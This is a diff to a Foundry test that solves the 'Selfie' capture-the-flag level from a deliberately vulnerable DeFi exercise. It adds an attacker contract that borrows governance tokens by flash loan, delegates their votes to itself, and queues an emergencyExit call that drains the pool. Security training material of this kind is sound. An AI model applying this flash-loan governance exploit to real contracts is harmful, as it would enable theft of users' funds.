@@ -6,6 +6,52 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+
+
+contract Attacker is IERC3156FlashBorrower{
+
+    address payable immutable RECIVER;
+    SimpleGovernance governance;
+    SelfiePool pool;
+
+    constructor(address payable _recovery, SimpleGovernance _governance, SelfiePool _pool){
+        RECIVER = _recovery;
+        governance = _governance;
+        pool = _pool;
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external override returns (bytes32){
+
+        bytes memory callData = abi.encodeCall(
+            pool.emergencyExit, (RECIVER)
+         );
+         
+        DamnValuableVotes(token).delegate(address(this));
+
+        governance.queueAction(address(pool), 0, callData);
+
+        DamnValuableVotes(token).approve(address(pool), amount+fee);
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function attack() external {
+        pool.flashLoan(this , governance.getVotingToken(), pool.maxFlashLoan(governance.getVotingToken()), bytes(""));
+    }
+
+    receive () external payable{
+    }
+
+}
+
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,12 +108,21 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
+        // console.log(address(this));
+        Attacker att = new Attacker(payable(recovery),governance,pool);
+        att.attack();
+
+        skip(2 days);
+
+        governance.executeAction(1);
         
     }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
+
+    
     function _isSolved() private view {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
